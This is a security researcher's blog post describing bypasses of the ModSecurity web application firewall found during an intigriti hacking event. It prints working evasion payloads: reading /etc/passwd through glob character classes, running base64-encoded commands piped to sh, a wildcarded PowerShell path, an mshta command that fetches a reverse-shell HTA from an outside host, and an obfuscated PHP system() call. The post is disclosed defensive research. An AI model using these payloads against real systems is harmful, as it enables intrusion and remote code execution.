---
layout: post
title:  "Bypassing ModSecurity for RCEs"
date:   2022-08-29 18:32:00 +0530
author: Somdev Sangwan
tags:   [event, bypass, security]
image: /imgs/thumbs/modsecurity-event.jpg
permalink: /blog/modsecurity-rce-bypass
description: "A tale of multiple RCE bypasses for ModSecurity WAF."  
---

> tl;dr: I won $17k by bypassing [ModSecurity](https://github.com/SpiderLabs/ModSecurity) for multiple RCEs in in a hacking event hosted by [intigriti](https://www.intigriti.com/).

## WAFs 101

Firewalls stop attacks. They can recognize them with their database of various rules that describe what an attack looks like. These rules are created by hand or automated analysis of thousands of actual attacks.
  
A web application firewall is a firewall, for websites.

### Blacklists are hard
`ping` is a tool commonly used to troubleshoot networks. As a WAF designer, you might want to block attempts to run it. But what if user A sends a text message to user B through your WAF,
> your router looks fine, try to ping google.com

That's it. The WAF blocked the message, the user filed a complaint to the website owner. The owner debugged the issue and found out that the WAF was at fault.  
Now prepare for an angry twitter thread to be shoved down your throat, your wife Karen leaving you and taking the kids with her. You are done.

Jokes apart and credit where it's due, writing anti-attack rules for unknown contexts is tough. You need to prioritize false negatives over false positives over multiple levels of security while still protecting against the most common attacks.

With that being said, let me tell you a tale of why I am so cool and such a genius for trying random things until some of them worked.

## Filenames in Linux
> Note: When I say "linux", it means *nix (linux and unix). This applies to the entire article.

It is common knowledge that in linux, wildcards such as `*` and `?` are allowed in filenames. But did you know that character classes are also allowed? If your file is named `test.txt`, you can access it by typing `te[sn]t.txt`. The `[sn]` here is a *character class* which says that the character in this place can be an `s` or an `n` i.e. it will match both `test.txt` and `tent.txt`.

If you add an exclamation symbol (`!`) at the beginning of the character class (i.e. `[!sn]`) it will match everything other than the characters in it (i.e. `s` and `n`).

These character classes notations were not getting detected by ModSecurity, giving us two neat bypasses:

```
cat /etc/pass[w]d
cat /etc/pass[!x]d
```

## Everything is a file in Unix
> "Everything is a file" describes one of the defining features of Unix, and its derivatives—that a wide range of input/output resources such as documents, directories, hard-drives, modems, keyboards, printers and even some inter-process and network communications are simple streams of bytes exposed through the filesystem name space.
> - [WikiPedia](en.wikipedia.org/wiki/Everything_is_a_file)

Every command in linux is ultimately an executable binary file stored in `/usr/bin`. Thus instead of executing `ping`, you can write `/usr/bin/ping` and it will work.

Building on my previous exploit that could only interact with files, I turned that file-access technique into a juicy RCE with  

```
/usr/bin/who[a]mi -a
```

## Utilising the linux utilities
There are some amazing [core utilities](https://en.wikipedia.org/wiki/List_of_GNU_Core_Utilities_commands) that come pre-installed in linux.

I cross-checked them with ModSecurity's rules and found some commands that were missing from the blacklist. With a bit of reading here and there, the `base64` utility caught my eye. As the name suggests, it does [base64](https://en.wikipedia.org/wiki/Base64) encoding/decoding.

The idea was to encode the command as base64, decode it and pass the result to something that can "eval" it as a command.

There were some problems with this plan,
1. base64 utility needed [stdin](https://linuxhint.com/bash_stdin_stderr_stdout/) and the only plausible way to do that was with `echo` (e.g. `echo dW5hbWUgLWE= | base64 -d`). But `echo` was blacklisted, as it should be.
2. `sh` (shell) command can execute stdin as a command. Unfortunately, it was blacklisted too and there is no alternative to `sh`.

I solved the first problem by using `printf` instead of `echo`. It's an echo-like utility that supports string formatting.

The second one seemed like a dead end, the most common outcome in research. I did what researchers do, I decided to pursue other ideas as a break.
It helped, after some messing around I found that if a command isn't followed by any character, it doesn't get detected.

Combining these two bypasses, the final bypass becomes this:
```
printf dW5hbWUgLWE= | base64 -d | sh
```

Here, we base64 encoded a command, used the `base64` to decode it and then used `sh` to execute the decoded command.  
  
The neat thing about this bypass is that you smuggle literally anything and since it's base64 encoded, the WAF won't detect a thing.

## Windows is no different
Hacking is about trying things. Sometimes stupidly obvious, sometimes things you learned from a 4-page forum thread from 2006 and sometimes whatever keys you can press with your blurry sleepy eyes at 4 AM.

I tried the `?` filepath wildcard on Windows and it worked. ModSecurity didn't detect it since the wildcard detection rules were for `/paths/like/this` not `C:\paths\like\this`. Easy.

```
C:\Windows\System32\WindowsPowerShell\v1.0\power?hell.exe -File test.ps1
```

### Programming languages have versions now?
ModSecurity blocked `python xyz`, `python2 xyz` and `python3 xyz`. "Unfortunately", you can also invoke specific versions of the interpreter as `python3.10 xyz` for example. This variation wasn't blacklisted and hence I found a way to install arbitrary malware using python.

```
python3.10 -m pip install malware
```

## Entering through the Windows  
Windows is a gold mine for not-so-well-known features. Some found through a blog of a 16yo reverse engineer, some through Windows 95 guides and some by simply googling "windows malware delivery github".

I found a utility named [mshta](https://redcanary.com/threat-detection-report/techniques/mshta/) which is a windows component that deals with HTA ([HTML Application](https://en.wikipedia.org/wiki/HTML_Application)) files. These files can contain executable VBScript code and there's even a metasploit module to generate malicious HTA files.  
  
ModSecurity didn't detect it which gave me a payload that can download+execute arbitrary VBScript code.

```
mshta http://example.com/reverseShell.hta
```

## PHP Injection

You should check out [OWASP Core Rule Set](https://github.com/coreruleset/coreruleset), the collection of WAF rules used by ModSecurity. The comprehensibly documented rules through comments make it an excellent resource.

While trying to get my PHP function calls through the WAF, I went through the documentation of the [rule](https://github.com/coreruleset/coreruleset/blob/977ccdfb914e6d62b00ae26e2006b75b22e3df6c/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf#L418) that detects them. It was there where I learned that an attacker can obfuscate a function call as:

```
$x='sy'.'tem';
$x(ls);
```

Something clicked immediately, what if I could do this segmentation without a variable? One thing led to another and after a bit of testing, I came up with:

```
return"system"(ls).s;
```

Don't ask me to explain how this one works, I don't know much about PHP. I just tried things that made sense after looking at known bypasses and this one worked in a PHP webpage I created for testing.

### Credits
ModSecurity is an open-source WAF and if you ask me, it's as good as WAFs get. It is almost impossible to bypass it for XSS, the rules are that good.

Shoutouts to them for maintaining such an important and free project responsibly and thanks to intigriti for hosting this hacking event and inviting me.

Until next time, fellas.
